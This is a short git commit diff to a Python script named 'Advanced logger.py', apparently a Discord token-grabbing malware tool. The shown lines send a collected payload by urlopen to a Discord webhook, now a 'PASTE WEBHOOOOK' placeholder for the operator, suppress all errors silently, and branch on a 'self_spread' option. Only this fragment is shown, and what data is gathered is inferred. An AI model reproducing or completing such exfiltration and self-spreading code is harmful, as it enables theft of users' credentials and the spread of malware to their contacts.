a80c54a1336be6a71ccc06bc89ba196043c78ac2
DatOneQuietKid <78164990+DaEpicSwag@users.noreply.github.com>
2021-03-08 11:42:51 -0500

    Update Advanced logger.py

--- Advanced logger.py
+++ Advanced logger.py
@@ -230,7 +230,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request(webhook, data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("PASTE WEBHOOOOK", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
